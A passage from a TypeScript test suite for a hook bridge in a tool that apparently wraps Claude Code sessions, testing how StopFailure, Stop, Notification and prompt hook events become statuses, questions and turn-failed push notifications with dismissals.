import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import type { ProtocolMessage, Question, QuestionOption, UUID } from '@remi/shared';
import {
  PROMPT_WAITING_HELD_MESSAGE,
  PROMPT_WAITING_TERMINAL_MESSAGE,
  generateId,
} from '@remi/shared';
import { hasLiveQuestionOnScreen } from '../../../src/api/live-questions.ts';
import { MessageAPI } from '../../../src/api/message-api.ts';
import { QuestionPresenceTracker } from '../../../src/api/question-presence-tracker.ts';
import { SubagentViewRegistry } from '../../../src/api/subagent-view-registry.ts';
import {
  type SubagentAlert,
  type SubagentAlertSink,
  SubagentAlerter,
} from '../../../src/auto-approve/subagent-alert.ts';
import {
  createInputHandlers,
  gateAnswerDeps,
  trackerScreenDeps,
} from '../../../src/cli/handlers/input-events.ts';
import { promptUpDeps } from '../../../src/cli/handlers/prompt-up.ts';
import { createSessionHandlers } from '../../../src/cli/handlers/session-events.ts';
import type { DeviceTokenEntry } from '../../../src/cli/handlers/trivial-events.ts';
import { __resetLoggerForTests, configureLogger } from '../../../src/cli/logger.ts';
import type { HookBridgeHandle } from '../../../src/cli/session-phases/hook-bridge-setup.ts';
import {
  setupHookBridge,
  terminalNoticeReason,
} from '../../../src/cli/session-phases/hook-bridge-setup.ts';
import { ClaudeHarness } from '../../../src/harness/index.ts';
import { HookServer } from '../../../src/hooks/hook-server.ts';
import { REMI_REGISTERED_HOOK_EVENTS } from '../../../src/hooks/hook-types.ts';
import type { PermissionDecision, StopFailureHookInput } from '../../../src/hooks/index.ts';
import {
  NotificationDispatcher,
  type PushFn,
  selectPushCategory,
} from '../../../src/notifications/notification-dispatcher.ts';
import {
  type TurnFailedNotifier,
  createTurnFailedRoutes,
  turnFailedCollapseId,
} from '../../../src/notifications/turn-failed.ts';
import { parseQuestion } from '../../../src/parser/question-parser.ts';
import type { PTYSession } from '../../../src/pty/pty-session.ts';
import { SessionBindingStore } from '../../../src/session/session-binding-store.ts';
import { SessionRegistryFile } from '../../../src/session/session-registry-file.ts';
import { SessionRegistry } from '../../../src/session/session-registry.ts';
import { SessionStore } from '../../../src/session/session-store.ts';
import { TranscriptDiscovery } from '../../../src/transcript/index.ts';
import {
  WRAPPED_DIRECTORY,
  WRAPPED_DIRECTORY_DIALOG,
} from '../../parser/fixtures/claude-dialogs.ts';
import { reserveRange } from '../../session/port-test-helpers.ts';

/**
 * Recording HookServer that captures `.on()` registrations AND lets tests
 * fire the registered listeners directly. Lets us exercise the 7 hook
 * callback bodies without starting a real Bun.serve HTTP listener.
 */
class RecordingHookServer {
  readonly listeners = new Map<string, (input: unknown) => void>();
  /** The synchronous PermissionRequest resolver (#496); set via setPermissionResolver. */
  permissionResolver:
    | ((input: unknown, signal: AbortSignal) => Promise<PermissionDecision>)
    | null = null;
  on(event: string, listener: (input: unknown) => void): () => void {
    // Only the last listener per event survives; for setupHookBridge this is
    // fine because it installs exactly one per event name.
    this.listeners.set(event, listener);
    return () => this.listeners.delete(event);
  }
  setPermissionResolver(
    resolver: ((input: unknown, signal: AbortSignal) => Promise<PermissionDecision>) | null,
  ): void {
    this.permissionResolver = resolver;
  }
  fire(event: string, input: unknown): void {
    // PermissionRequest is no longer a `.on()` listener (#496) — it is the
    // synchronous resolver. Tests that fire it purely to drive the binder
    // (binding/foreign-drop/rotation) keep working: the binder bind + admit run
    // SYNCHRONOUSLY inside the resolver before the async decision, which we
    // fire-and-forget here. Decision-asserting tests use `await firePermission`.
    if (event === 'PermissionRequest' && !this.listeners.has(event) && this.permissionResolver) {
      void this.permissionResolver(input, new AbortController().signal);
      return;
    }
    const fn = this.listeners.get(event);
    if (!fn) throw new Error(`No listener registered for ${event}`);
    fn(input);
  }
  /** Fire a PermissionRequest through the synchronous resolver (#496) and return
   *  the decision. A held prompt's decision settles only when it is answered
   *  or released (#1126), so callers holding one must not await it first. */
  async firePermission(
    input: unknown,
    signal: AbortSignal = new AbortController().signal,
  ): Promise<PermissionDecision> {
    if (!this.permissionResolver) throw new Error('No permission resolver registered');
    return this.permissionResolver(input, signal);
  }
}

/** PTYSession fake that records every keystroke path: `submitInput` calls
 *  as-is and raw `write` calls prefixed `write:` (an Esc, a runner key). A
 *  held prompt is answered through its hook (#1126), so its tests assert this
 *  stays empty; the typed-answer tests assert exactly what reached it. */
function fakePTY(submits: string[]): PTYSession {
  return {
    id: generateId(),
    isRunning: true,
    write: async (data: string) => {
      submits.push(`write:${data}`);
    },
    submitInput: async (content: string) => {
      submits.push(content);
    },
    close: async () => {},
  } as unknown as PTYSession;
}

interface MessageApiCallLog {
  resetCalls: { n: number };
  statusCalls: string[];
  questionCalls: number;
}

function fakeMessageAPI(
  log: MessageApiCallLog,
  opts: { throwOnQuestionTimes?: number } = {},
): MessageAPI {
  let throwsLeft = opts.throwOnQuestionTimes ?? 0;
  return {
    handleMessage: () => {},
    handleStatusChange: (status: string) => {
      log.statusCalls.push(status);
    },
    handleQuestion: () => {
      log.questionCalls += 1;
      if (throwsLeft > 0) {
        throwsLeft -= 1;
        throw new Error('test: handleQuestion synthetic failure');
      }
    },
    reset: () => {
      log.resetCalls.n += 1;
    },
  } as unknown as MessageAPI;
}

/**
 * Tracker used by setupHookBridge tests. Bridge calls onQuestion →
 * recordPendingHook, which on real wiring stores and waits for PTY. In
 * these tests we have no PTY, so the passthrough collapses recordPendingHook
 * into onPTYPromptVisible — i.e. simulate a terminal whose prompt is always
 * visible. Lets the existing `questionCalls` assertions keep their meaning
 * ("the bridge emitted a question to the consumer"). True PTY-presence
 * semantics are validated in tests/api/question-presence-tracker.test.ts.
 */
class PassthroughTracker extends QuestionPresenceTracker {
  override recordPendingHook(question: Question): void {
    this.onPTYPromptVisible(question);
  }
}

function makePassthroughTracker(api: MessageAPI): PassthroughTracker {
  return new PassthroughTracker((q) => api.handleQuestion(q));
}

const SID = 'a1b2c3d4-e5f6-7890-abcd-ef0123456789' as UUID;

describe('setupHookBridge', () => {
  let tmpDir: string;
  let sessionRegistry: SessionRegistry;
  let sessionStore: SessionStore;
  let bindingStore: SessionBindingStore;
  let liveSessionsRegistry: SessionRegistryFile;
  // Stored loosely so tests can inject a minimal fake watcher without
  // dragging in a real TranscriptWatcher instance.
  let transcriptWatchers: Map<UUID, { filePath: string; stop: () => void }>;
  let transcriptFallbackTimers: Map<UUID, ReturnType<typeof setInterval>>;
  let hookServer: RecordingHookServer;
  let ptySubmits: string[];
  let messageApiLog: MessageApiCallLog;
  // Every setupHookBridge() call in this file registers its returned handle
  // here so afterEach can close its TranscriptBinder: the binder unconditionally
  // arms a fallback poll + #452 rotation dir-poll (setInterval) whenever the
  // session has a bound claudeSessionId, and only closeBinder() tears those
  // down. Without this every such test would leak a live timer.
  let bridgeHandles: HookBridgeHandle[];

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'remi-hook-bridge-'));
    sessionRegistry = new SessionRegistry({ orphanTimeoutMs: 60000 });
    sessionStore = new SessionStore(path.join(tmpDir, 'sessions.json'));
    bindingStore = new SessionBindingStore(sessionStore);
    // Live-sessions registry gets its OWN subdir so its listLive() scan does
    // not see (and delete as "invalid") the SessionStore's sessions.json that
    // shares the tmp root. Create it up front so tests that write sibling
    // entries directly into dirPath don't need their own mkdir.
    liveSessionsRegistry = new SessionRegistryFile(path.join(tmpDir, 'live-sessions'));
    fs.mkdirSync(liveSessionsRegistry.dirPath, { recursive: true });
    transcriptWatchers = new Map();
    transcriptFallbackTimers = new Map();
    hookServer = new RecordingHookServer();
    ptySubmits = [];
    messageApiLog = { resetCalls: { n: 0 }, statusCalls: [], questionCalls: 0 };
    bridgeHandles = [];
    configureLogger({ writeLog: () => {} });
  });

  afterEach(async () => {
    __resetLoggerForTests();
    for (const h of bridgeHandles) {
      try {
        h.closeBinder();
      } catch {
        /* already closed */
      }
    }
    // Stop any transcript watchers a test left running (tests that fire
    // SessionStart start a real TranscriptWatcher with an fs.watch + 1s poll;
    // without this they leak a timer + fd past the test). Covers the
    // pre-existing rotation tests too.
    for (const w of transcriptWatchers.values()) {
      try {
        w.stop();
      } catch {
        /* already stopped */
      }
    }
    // Backstop: closeBinder() above already cancels each binder's own fallback
    // timer, but clear the shared map directly too in case a test's handle was
    // not registered in bridgeHandles.
    for (const t of transcriptFallbackTimers.values()) {
      clearInterval(t);
    }
    transcriptFallbackTimers.clear();
    await sessionRegistry.shutdown();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function build(
    opts: {
      throwOnQuestionTimes?: number;
      /** Use a real QuestionPresenceTracker (no PTY-visible passthrough)
       *  so tests can exercise the actual record-pending / status-clear
       *  contract through the bridge wiring. Defaults to the passthrough
       *  tracker used by the legacy assertion-style tests. */
      realTracker?: boolean;
      /** Shorten `QuestionPresenceTracker`'s orphan-PTY debounce (default
       *  1.5s) so a test can drive the real hooked-session orphan path without
       *  a long wait. Only meaningful with `realTracker`. */
      orphanDebounceMs?: number;
      /** Capture every broadcastQuestionResolved call (#585, P7). Each entry is
       *  the (questionId, reason) the bridge forwarded. Defaults to undefined
       *  (dep not wired). */
      broadcastResolvedLog?: Array<{ questionId: UUID; reason: string }>;
      /** Capture every foreignSessionEscalator.handleUnadmitted call (#672).
       *  Each entry is the (input, callerSessionId) the resolver forwarded.
       *  Defaults to undefined (dep not wired). */
      foreignEscalationLog?: Array<{ input: unknown; sessionId: UUID }>;
      /** Real SubagentViewRegistry instance (#891 tests need to inspect
       *  recordStart/recordStop's effect on the stored transcript path).
       *  Defaults to undefined (dep not wired, matches production callers
       *  that skip subagent-view tracking). */
      subagentViews?: SubagentViewRegistry;
      /**
       * Construct the REAL `MessageAPI` (real `QuestionDedup` inside it) -- per
       * ADR 0014, tests that assert a card actually reached the registry (not
       * just "the bridge called a stub N times") must construct the real push
       * path, not `fakeMessageAPI`.
       *
       * The `onQuestion` callback below reproduces only the ONE step these
       * tests assert on, `sessionRegistry.addQuestion`; it is deliberately not
       * a copy of `message-api-setup.ts`'s callback, which also does
       * `sendAndRecord`, the push/held decision and `claudeSessionId` stamping.
       * What is real here is `MessageAPI` itself and the dedup inside it --
       * the component whose behavior the elicitation tests turn on. Say which,
       * because "wired exactly as production" would be the kind of coverage
       * overclaim ADR 0014 exists to catch.
       *
       * Defaults to false (the existing fake, unchanged for every pre-#889
       * test in this file).
       */
      realMessageApi?: boolean;
      /** Override the session cwd when testing repository-bound behavior. */
      workingDirectory?: string;
      /** Give the real tracker the two registry-backed deps cli.ts wires
       *  (`hasLiveQuestions` and the `sessionRegistry.removeQuestion` half of
       *  `onHooklessQuestionGone`), so redraw-echo suppression and render-owned
       *  resolution run as they do in production. Only those two deps; it does
       *  not claim the rest of cli.ts's wiring. Only meaningful with
       *  `realTracker`. */
      liveQuestionDeps?: boolean;
      /** Record every push the REAL tracker makes, with its `held` flag.
       *  Only meaningful with `realTracker`. */
      pushLog?: Array<{ question: Question; held: boolean }>;
      /** Hold deadline for binary prompts (#1126); default 60 s. */
      holdMs?: number;
      /** Record every terminal notice pushed or dismissed (#1126). */
      noticeLog?: Array<{ questionId: UUID; text: string; reason: string }>;
      /** Wrapper mode (true, the default) or daemon/hub mode (#1126). */
      hasLocalTerminal?: boolean;
      /** The harness_denied sink (#1126). */
      onHarnessDenied?: (input: unknown) => void;
      /** The turn_failed sink (#1153). */
      pushTurnFailed?: (sessionId: UUID, input: StopFailureHookInput) => void;
      /** The turn_failed dismissal sink (#1153). */
      dismissTurnFailed?: (sessionId: UUID) => void;
      /** A real `HookServer` to register the listeners on, instead of the
       *  recording one (#1153: a recorded payload POSTed over HTTP). */
      realServer?: HookServer;
      /** The subagent alert feed (#1155). */
      subagentAlerts?: SubagentAlertSink;
    } = {},
  ): { tracker: QuestionPresenceTracker; messageApi: MessageAPI; handle: HookBridgeHandle } {
    const sessionWorkingDirectory = opts.workingDirectory ?? tmpDir;
    const localMessageApi: MessageAPI = opts.realMessageApi
      ? new MessageAPI(
          { sessionId: SID, initialBulletId: 1 },
          {
            onQuestion: (question) => {
              messageApiLog.questionCalls += 1;
              sessionRegistry.addQuestion(SID, question, question.source ?? 'unknown');
            },
            onStatusChange: (status) => {
              messageApiLog.statusCalls.push(status);
            },
          },
        )
      : fakeMessageAPI(
          messageApiLog,
          opts.throwOnQuestionTimes !== undefined
            ? { throwOnQuestionTimes: opts.throwOnQuestionTimes }
            : {},
        );
    // The tracker is built before the bridge that owns the gate, so its
    // live-question check reads the handle lazily, as cli.ts does.
    const handleRef: { current?: HookBridgeHandle } = {};
    const tracker: QuestionPresenceTracker = opts.realTracker
      ? new QuestionPresenceTracker(
          (q, pushOpts) => {
            opts.pushLog?.push({ question: q, held: pushOpts?.held === true });
            return localMessageApi.handleQuestion(q, pushOpts);
          },
          // Only pass deps when a test asked for them, so the pre-existing
          // realTracker tests keep their exact wiring (default 1.5s window, no
          // hasLiveQuestions dep).
          opts.orphanDebounceMs !== undefined || opts.liveQuestionDeps
            ? {
                ...(opts.orphanDebounceMs !== undefined
                  ? { orphanDebounceMs: opts.orphanDebounceMs }
                  : {}),
                ...(opts.liveQuestionDeps
                  ? {
                      // Wired exactly as cli.ts wires it.
                      hasLiveQuestions: () =>
                        hasLiveQuestionOnScreen(
                          sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [],
                          (questionId) =>
                            handleRef.current?.gate.isHeld(questionId as UUID) ?? false,
                        ),
                      onHooklessQuestionGone: (questionId: string, reason: string) => {
                        sessionRegistry.removeQuestion(
                          SID,
                          questionId as UUID,
                          reason,
                          undefined,
                          'test.onHooklessQuestionGone',
                        );
                      },
                    }
                  : {}),
              }
            : undefined,
        )
      : makePassthroughTracker(localMessageApi);
    sessionRegistry.registerSession(
      SID,
      sessionWorkingDirectory,
      fakePTY(ptySubmits),
      localMessageApi,
    );

    const handle = setupHookBridge(
      {
        sessionRegistry,
        bindingStore,
        liveSessionsRegistry,
        transcriptWatchers: transcriptWatchers as unknown as Map<
          UUID,
          import('../../../src/transcript/transcript-watcher.ts').TranscriptWatcher
        >,
        transcriptFallbackTimers,
        currentPort: () => 8765,
        transcriptDiscovery: new TranscriptDiscovery(),
        holdMs: opts.holdMs ?? 60_000,
        hookTimeoutMs: (opts.hasLocalTerminal ?? true) ? 600_000 : 3_600_000,
        ...(opts.onHarnessDenied ? { onHarnessDenied: opts.onHarnessDenied } : {}),
        ...(opts.pushTurnFailed ? { pushTurnFailed: opts.pushTurnFailed } : {}),
        ...(opts.dismissTurnFailed ? { dismissTurnFailed: opts.dismissTurnFailed } : {}),
        ...(opts.noticeLog
          ? {
              pushTerminalNotice: (_sid: UUID, question: Question, reason: string) =>
                opts.noticeLog?.push({ questionId: question.id, text: question.text, reason }),
              dismissTerminalNotice: (_sid: UUID, questionId: UUID) =>
                opts.noticeLog?.push({ questionId, text: '', reason: 'dismissed' }),
            }
          : {}),
        ...(opts.subagentViews ? { subagentViews: opts.subagentViews } : {}),
        ...(opts.subagentAlerts ? { subagentAlerts: opts.subagentAlerts } : {}),
        ...(opts.broadcastResolvedLog
          ? {
              broadcastQuestionResolved: (_sid: UUID, questionId: UUID, reason: 'cancelled') =>
                opts.broadcastResolvedLog?.push({ questionId, reason }),
            }
          : {}),
        ...(opts.foreignEscalationLog
          ? {
              foreignSessionEscalator: {
                handleUnadmitted: (input: unknown, sid: UUID) =>
                  opts.foreignEscalationLog?.push({ input, sessionId: sid }),
              } as unknown as import('../../../src/hooks/index.ts').ForeignSessionEscalator,
            }
          : {}),
      },
      {
        hookServer: opts.realServer ?? (hookServer as unknown as HookServer),
        sessionId: SID,
        workingDirectory: sessionWorkingDirectory,
        messageApi: localMessageApi,
        sendAndRecord: () => {},
        // PassthroughTracker is the default: it collapses
        // recordPendingHook into an immediate push so the legacy
        // "bridge emitted a question to the consumer" assertions via
        // questionCalls still work. opts.realTracker uses the real
        // QuestionPresenceTracker for wiring tests (record/status-clear
        // through the bridge). Pure PTY-presence semantics are validated
        // in tests/api/question-presence-tracker.test.ts.
        tracker,
        hasLocalTerminal: opts.hasLocalTerminal ?? true,
      },
    );
    handleRef.current = handle;
    bridgeHandles.push(handle);
    return { tracker, messageApi: localMessageApi, handle };
  }

  test('registers a .on() listener for every REMI_REGISTERED_HOOK_EVENTS entry except the resolver-installed PermissionRequest (#927)', () => {
    build();
    const events = new Set(hookServer.listeners.keys());
    // PermissionRequest is NOT a .on() listener — it is the synchronous
    // resolver (#496), installed via setPermissionResolver, so it is the one
    // known subtraction from the registry. Deriving the expected set from
    // REMI_REGISTERED_HOOK_EVENTS instead of a hand-copied literal is the
    // point of this test (#927): the registered-event count has moved twice
    // in one day (14 -> 15 -> 14, #937 then #930) with the listener count
    // following it (13 -> 14 -> 13). A hardcoded count here goes stale on
    // every such change; deriving it fails the moment the registry and the
    // listener block disagree, which is the actual guarantee this test
    // exists to provide.
    const expectedListenerEvents = new Set(
      REMI_REGISTERED_HOOK_EVENTS.filter((event) => event !== 'PermissionRequest'),
    );
    expect(events).toEqual(expectedListenerEvents);
    expect(hookServer.permissionResolver).not.toBeNull();
  });

  describe('UserPromptSubmit listener (#893)', () => {
    function lock(id: string): void {
      // #930: SessionStart is no longer a registered/dispatched hook
      // event (Claude Code discards http-type hooks for it). Notification
      // with a neutral type locks the binder via the same onHookEvent()
      // first-adopt path with zero downstream side effects (handleNotification
      // no-ops for anything outside permission_prompt/idle_prompt/
      // elicitation_dialog).
      hookServer.fire('Notification', {
        session_id: id,
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        hook_event_name: 'Notification',
        notification_type: 'auth_success',
        message: '',
      });
    }

    test('does not throw when the listener fires with no downstream consumer wired', () => {
      build();
      lock('claude-q9-4');
      expect(() =>
        hookServer.fire('UserPromptSubmit', {
          session_id: 'claude-q9-4',
          transcript_path: path.join(tmpDir, 'claude-q9-4.jsonl'),
          hook_event_name: 'UserPromptSubmit',
          prompt: 'hello',
          session_title: 'test',
        }),
      ).not.toThrow();
    });
  });

  describe('phase 4 (#453): the 4 previously-dropped events', () => {
    /** Fire a neutral Notification so the bridge locks onto `id` (admit gate then passes; #930). */
    function lock(id: string): void {
      // #930: SessionStart is no longer a registered/dispatched hook
      // event (Claude Code discards http-type hooks for it). Notification
      // with a neutral type locks the binder via the same onHookEvent()
      // first-adopt path with zero downstream side effects (handleNotification
      // no-ops for anything outside permission_prompt/idle_prompt/
      // elicitation_dialog).
      hookServer.fire('Notification', {
        session_id: id,
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        hook_event_name: 'Notification',
        notification_type: 'auth_success',
        message: '',
      });
    }

    // #1153: a StopFailure is a failed turn, not a question. The old cards
    // ("Session stop failed (undefined). Retry?") had Yes/No no answer could
    // reach, and stacked one per failed turn.
    const stopFailure = (over: Record<string, unknown> = {}) => ({
      session_id: 'claude-A',
      hook_event_name: 'StopFailure',
      error: 'rate_limit',
      last_assistant_message: "You've hit your session limit",
      ...over,
    });

    test('StopFailure registers no question and sets idle, not waiting (#1153)', () => {
      build({ realMessageApi: true });
      lock('claude-A');
      messageApiLog.statusCalls.length = 0;
      hookServer.fire('StopFailure', stopFailure());
      expect(messageApiLog.questionCalls).toBe(0);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
      expect(messageApiLog.statusCalls).toEqual(['idle']);
    });

    test('StopFailure registers no question with a real tracker either (#1153)', () => {
      build({ realTracker: true, realMessageApi: true });
      lock('claude-A');
      hookServer.fire('StopFailure', stopFailure());
      expect(messageApiLog.questionCalls).toBe(0);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
    });

    test('StopFailure for a FOREIGN session_id is dropped by the admit gate', () => {
      const pushed: StopFailureHookInput[] = [];
      build({ pushTurnFailed: (_sid, input) => pushed.push(input) });
      lock('claude-A');
      messageApiLog.statusCalls.length = 0;
      hookServer.fire('StopFailure', stopFailure({ session_id: 'claude-OTHER' }));
      expect(messageApiLog.questionCalls).toBe(0);
      expect(messageApiLog.statusCalls).toEqual([]);
      expect(pushed).toEqual([]);
    });

    test('an admitted StopFailure reaches pushTurnFailed once, with this session id and the payload (#1153)', () => {
      const pushed: Array<{ sessionId: UUID; input: StopFailureHookInput }> = [];
      build({ pushTurnFailed: (sessionId, input) => pushed.push({ sessionId, input }) });
      lock('claude-A');
      hookServer.fire('StopFailure', stopFailure());
      expect(pushed).toHaveLength(1);
      expect(pushed[0]?.sessionId).toBe(SID);
      expect(pushed[0]?.input.error).toBe('rate_limit');
      expect(pushed[0]?.input.last_assistant_message).toBe("You've hit your session limit");
    });

    test('a throwing pushTurnFailed never escapes into the hook dispatch loop (#1153)', () => {
      build({
        pushTurnFailed: () => {
          throw new Error('test: push sink exploded');
        },
      });
      lock('claude-A');
      messageApiLog.statusCalls.length = 0;
      expect(() => hookServer.fire('StopFailure', stopFailure())).not.toThrow();
      // The status change happened before the push was attempted.
      expect(messageApiLog.statusCalls).toEqual(['idle']);
    });

    test('with no pushTurnFailed wired, StopFailure still sets idle and does not throw', () => {
      build();
      lock('claude-A');
      messageApiLog.statusCalls.length = 0;
      expect(() => hookServer.fire('StopFailure', stopFailure())).not.toThrow();
      expect(messageApiLog.statusCalls).toEqual(['idle']);
    });

    test('an agent_id-tagged StopFailure leaves the main status alone, registers no card, and is still pushed (#1153)', () => {
      const pushed: StopFailureHookInput[] = [];
      build({
        realTracker: true,
        realMessageApi: true,
        pushTurnFailed: (_sid, input) => pushed.push(input),
      });
      lock('claude-A');
      messageApiLog.statusCalls.length = 0;
      hookServer.fire(
        'StopFailure',
        stopFailure({ agent_id: 'agent-9', agent_type: 'general-purpose' }),
      );
      // Main is still running: no status change reached the pipeline.
      expect(messageApiLog.statusCalls).toEqual([]);
      expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
      expect(pushed).toHaveLength(1);
      expect(pushed[0]?.agent_type).toBe('general-purpose');
    });

    describe('turn_failed push through a real NotificationDispatcher (#1153)', () => {
      const TOKEN_ENTRY = (token: string, pushPrefs?: DeviceTokenEntry['pushPrefs']) => ({
        token,
        platform: 'ios',
        registeredAt: 1,
        connectionId: 'c0000000-0000-0000-0000-000000000000' as UUID,
        ...(pushPrefs !== undefined && { pushPrefs }),
      });

      /** The wiring cli.ts does: the session's dispatcher behind the real
       *  `createTurnFailedRoutes`. The sink is a recording `PushFn` (transport
       *  only), and the notifier wrapper only records the dispatcher's
       *  outcomes; everything between the hook and the sink is real. */
      function wire(deviceTokens: Map<string, DeviceTokenEntry>, realServer?: HookServer) {
        const sent: Array<{ token: string; opts: Record<string, unknown> }> = [];
        const pushFn: PushFn = async (_url, token, opts) => {
          sent.push({ token, opts: opts as unknown as Record<string, unknown> });
        };
        const dispatcher = new NotificationDispatcher(
          {
            sessionRegistry,
            deviceTokens,
            pushConfig: () => ({ signalingUrl: 'ws://x' }),
            getPrimarySessionId: () => SID,
            pushFn,
          },
          SID,
        );
        const outcomes: Array<Promise<string>> = [];
        const notifier: TurnFailedNotifier = {
          pushTurnFailed: (input) => {
            const outcome = dispatcher.pushTurnFailed(input);
            outcomes.push(outcome);
            return outcome;
          },
          dismissTurnFailed: () => dispatcher.dismissTurnFailed(),
        };
        const routes = createTurnFailedRoutes(new Map([[SID, notifier]]));
        build({
          realTracker: true,
          realMessageApi: true,
          pushTurnFailed: routes.push,
          dismissTurnFailed: routes.dismiss,
          ...(realServer ? { realServer } : {}),
        });
        return { sent, outcomes };
      }

      test('a failed turn pushes exactly once, kind turn_failed, with readable text and no card', async () => {
        const { sent, outcomes } = wire(new Map([['tok-a', TOKEN_ENTRY('tok-a')]]));
        lock('claude-A');
        hookServer.fire('StopFailure', stopFailure());
        expect(await Promise.all(outcomes)).toEqual(['pushed']);

        expect(sent).toHaveLength(1);
        const opts = sent[0]?.opts ?? {};
        expect(opts['kind']).toBe('turn_failed');
        expect(opts['questionId']).toBe(turnFailedCollapseId(SID));
        expect(opts['category']).toBeUndefined();
        expect(opts['options']).toBeUndefined();
        expect(String(opts['title'])).toContain('Claude stopped');
        expect(String(opts['body'])).toBe(
          "Rate or usage limit reached. You've hit your session limit",
        );
        expect(String(opts['body'])).not.toMatch(/undefined|null|Retry/);
        expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
      });

      test('a later failure in the same session reuses the one collapse key', async () => {
        const { sent, outcomes } = wire(new Map([['tok-a', TOKEN_ENTRY('tok-a')]]));
        lock('claude-A');
        hookServer.fire('StopFailure', stopFailure());
        // Another reason: a repeat of the first is not pushed at all (#1226).
        hookServer.fire(
          'StopFailure',
          stopFailure({ prompt_id: 'second-turn', error: 'overloaded' }),
        );
        await Promise.all(outcomes);

        expect(sent).toHaveLength(2);
        expect(sent[0]?.opts['questionId']).toBe(sent[1]?.opts['questionId']);
        expect(sent[0]?.opts['questionId']).toBe(turnFailedCollapseId(SID));
      });

      test('the recorded #905 payload, POSTed to a real HookServer, becomes one readable turn_failed push', async () => {
        // The shape of the 3 real captures (hook-corpus.jsonl) and the text
        // the issue quotes, delivered the way Claude Code delivers it: an HTTP
        // POST to the hook server. The transport is real end to end; only the
        // APNS call is a recording sink.
        const port = await reserveRange(1, 50, '127.0.0.1');
        const server = new HookServer({ port });
        const { sent, outcomes } = wire(new Map([['tok-a', TOKEN_ENTRY('tok-a')]]), server);
        server.start();
        try {
          const post = (body: Record<string, unknown>) =>
            fetch(`http://127.0.0.1:${port}/hooks`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                session_id: 'claude-A',
                transcript_path: path.join(tmpDir, 'claude-A.jsonl'),
                cwd: tmpDir,
                prompt_id: '0569c6ec-d989-45eb-52d9-9779421073f7',
                effort: { level: 'xhigh' },
                ...body,
              }),
            });
          // Locks the binder onto this Claude session, as the first event does.
          await post({
            hook_event_name: 'Notification',
            notification_type: 'auth_success',
            message: '',
          });
          const res = await post({
            hook_event_name: 'StopFailure',
            error: 'server_error',
            last_assistant_message:
              'API Error: 500 Internal server error. This is a server-side issue, usually temporary — try again in a moment. If it persists, check https://status.claude.com.',
          });
          expect(res.status).toBe(200);
          expect(await Promise.all(outcomes)).toEqual(['pushed']);

          expect(sent).toHaveLength(1);
          const opts = sent[0]?.opts ?? {};
          expect(opts['kind']).toBe('turn_failed');
          expect(String(opts['title'])).toContain('Claude stopped');
          expect(
            String(opts['body']).startsWith('Server error. API Error: 500 Internal server error.'),
          ).toBe(true);
          expect(String(opts['body'])).not.toMatch(/undefined|null|Retry/);
          expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);
          expect(messageApiLog.statusCalls.at(-1)).toBe('idle');
        } finally {
          server.stop();
        }
      });

      describe('a later turn clears the notice (#1153)', () => {
        const flush = () => new Promise((resolve) => setTimeout(resolve, 10));
        const stop = (over: Record<string, unknown> = {}) => ({
          session_id: 'claude-A',
          hook_event_name: 'Stop',
          stop_hook_active: false,
          last_assistant_message: 'done',
          ...over,
        });
        const prompt = (over: Record<string, unknown> = {}) => ({
          session_id: 'claude-A',
          hook_event_name: 'UserPromptSubmit',
          prompt: 'try again',
          ...over,
        });
        const MUTED = {
          questions: true,
          turnComplete: true,
          harnessDenied: true,
          turnFailed: false,
        };
        const dismissals = (sent: Array<{ token: string; opts: Record<string, unknown> }>) =>
          sent.filter((p) => p.opts['kind'] === 'dismiss');

        test('the next main Stop sends a quiet dismiss with the same collapse key to every device, a muted one included', async () => {
          const { sent, outcomes } = wire(
            new Map([
              ['wants', TOKEN_ENTRY('wants')],
              ['muted', TOKEN_ENTRY('muted', MUTED)],
            ]),
          );
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);
          // The alert reached only the device that wants it.
          expect(sent.map((p) => p.token)).toEqual(['wants']);

          hookServer.fire('Stop', stop());
          await flush();

          const cleared = dismissals(sent);
          // A device that muted failed turns may still hold a delivered notice.
          expect(cleared.map((p) => p.token).sort()).toEqual(['muted', 'wants']);
          for (const { opts } of cleared) {
            expect(opts['questionId']).toBe(turnFailedCollapseId(SID));
            expect(opts['dismiss']).toBe(true);
            expect(opts['title']).toBeUndefined();
            expect(opts['body']).toBeUndefined();
          }
        });

        test('a new prompt does not clear it: at a usage limit every prompt fails too (#1226)', async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);

          hookServer.fire('UserPromptSubmit', prompt());
          await flush();

          expect(dismissals(sent)).toEqual([]);
        });

        test('nothing is sent when no failure is outstanding, and only once per failure', async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');

          // No failure yet: a Stop and a prompt send nothing at all.
          hookServer.fire('Stop', stop());
          hookServer.fire('UserPromptSubmit', prompt());
          await flush();
          expect(sent).toEqual([]);

          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);
          hookServer.fire('Stop', stop());
          hookServer.fire('Stop', stop());
          hookServer.fire('UserPromptSubmit', prompt());
          await flush();
          expect(dismissals(sent)).toHaveLength(1);

          // A second failure re-arms it.
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);
          hookServer.fire('Stop', stop());
          await flush();
          expect(dismissals(sent)).toHaveLength(2);
        });

        test('a stop-hook re-entry, a subagent prompt and a foreign session clear nothing', async () => {
          const { sent, outcomes } = wire(new Map([['wants', TOKEN_ENTRY('wants')]]));
          lock('claude-A');
          hookServer.fire('StopFailure', stopFailure());
          await Promise.all(outcomes);

          hookServer.fire('Stop', stop({ stop_hook_active: true }));
          hookServer.fire('UserPromptSubmit', prompt({ agent_id: 'agent-1' }));
